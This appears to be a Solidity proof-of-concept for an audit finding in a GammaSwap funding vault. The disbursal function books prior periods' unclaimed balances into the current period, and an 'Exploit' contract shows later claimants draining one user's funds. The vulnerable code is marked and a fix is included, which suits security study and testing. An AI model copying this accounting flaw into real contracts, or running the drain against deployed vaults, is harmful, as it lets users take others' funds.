// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  GammaSwap FundingVault — C-01 (Pashov, 2024-12-30)
    disburseClaims() writes the whole token balance into totalClaimable[period],
    including funds already owed to earlier periods. Period-3 claimants then
    take Alice's unclaimed 1000. Bob, entitled to 100, receives 300. Alice's
    period-2 claim pays 0.

    Verbatim: totalClaimable[_period] = GammaSwapLibrary.balanceOf(...)
              and the min() cap inside claim().
*/

contract ClaimToken {
    string public symbol = "GS";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

library GammaSwapLibrary {
    function balanceOf(address token, address account) internal view returns (uint256) {
        return ClaimToken(token).balanceOf(account);
    }

    function safeTransfer(address token, address to, uint256 amount) internal {
        require(ClaimToken(token).transfer(to, amount), "transfer");
    }
}

library GSMath {
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

contract FundingVault {
    using GSMath for uint256;

    address public claimToken;
    address public manager;
    uint256 public currentPeriod;
    mapping(uint256 => uint256) public totalClaimable;
    mapping(uint256 => uint256) public totalWeight;
    mapping(uint256 => mapping(address => uint256)) public weight;
    mapping(uint256 => mapping(address => bool)) public hasClaimed;
    mapping(address => uint256) public paid;

    modifier isManager() {
        require(msg.sender == manager, "manager");
        _;
    }

    constructor(address _claimToken, address _manager) {
        claimToken = _claimToken;
        manager = _manager;
    }

    function setPeriod(uint256 period) external isManager {
        currentPeriod = period;
    }

    function setWeight(uint256 period, address user, uint256 w) external isManager {
        totalWeight[period] -= weight[period][user];
        weight[period][user] = w;
        totalWeight[period] += w;
    }

    function disburseClaims() external isManager {
        uint256 _period = currentPeriod;
        totalClaimable[_period] = GammaSwapLibrary.balanceOf(claimToken, address(this)); // @> VULN: prior periods' unclaimed balance is assigned to this period
        // FIX: totalClaimable[_period] = newClaimable; // pass only this period's fresh rewards
    }

    /// @notice Recommended fix from the report. Not used by run().
    function disburseClaimsFixed(uint256 newClaimable) external isManager {
        totalClaimable[currentPeriod] = newClaimable;
    }

    function claim(uint256 _period) external {
        require(!hasClaimed[_period][msg.sender], "claimed");
        require(weight[_period][msg.sender] > 0, "weight");
        hasClaimed[_period][msg.sender] = true;
        uint256 _claimable = totalClaimable[_period] * weight[_period][msg.sender] / totalWeight[_period];
        address _to = msg.sender;
        _claimable = GSMath.min(GammaSwapLibrary.balanceOf(claimToken, address(this)), _claimable);
        GammaSwapLibrary.safeTransfer(claimToken, _to, _claimable);
        paid[_to] += _claimable;
    }
}

contract Claimant {
    FundingVault public vault;

    constructor(FundingVault _vault) {
        vault = _vault;
    }

    function claim(uint256 period) external {
        vault.claim(period);
    }
}

contract Exploit {
    ClaimToken public token; // CREATE nonce 1
    FundingVault public vault; // CREATE nonce 2 — vulnerable
    Claimant public alice; // CREATE nonce 3
    Claimant public carol; // CREATE nonce 4

    constructor() {
        token = new ClaimToken();
        vault = new FundingVault(address(token), address(this));
        alice = new Claimant(vault);
        carol = new Claimant(vault);

        // Period 2: Alice is owed 1000 and does not claim. Disburse is correct
        // here because the vault holds only this period's rewards.
        token.mint(address(vault), 1000 ether);
        vault.setPeriod(2);
        vault.setWeight(2, address(alice), 1000);
        vault.disburseClaims();

        // Period 3 starts. 500 of new rewards land on top of Alice's 1000.
        token.mint(address(vault), 500 ether);
        vault.setPeriod(3);
        vault.setWeight(3, address(this), 100); // Bob, fair share 100 of the 500
        vault.setWeight(3, address(carol), 400);
    }

    function run() external {
        vault.disburseClaims(); // totalClaimable[3] = 1500, not 500
        require(vault.totalClaimable(3) == 1500 ether, "period 3 booked the old funds");
        vault.claim(3); // Bob
        carol.claim(3);
        alice.claim(2);
        require(vault.paid(address(this)) == 300 ether, "bob received 300");
        require(vault.paid(address(carol)) == 1200 ether, "carol received 1200");
        require(vault.paid(address(alice)) == 0, "alice received nothing");
        require(token.balanceOf(address(vault)) == 0, "vault drained");
        require(token.balanceOf(address(this)) == 300 ether, "bob balance");
    }
}
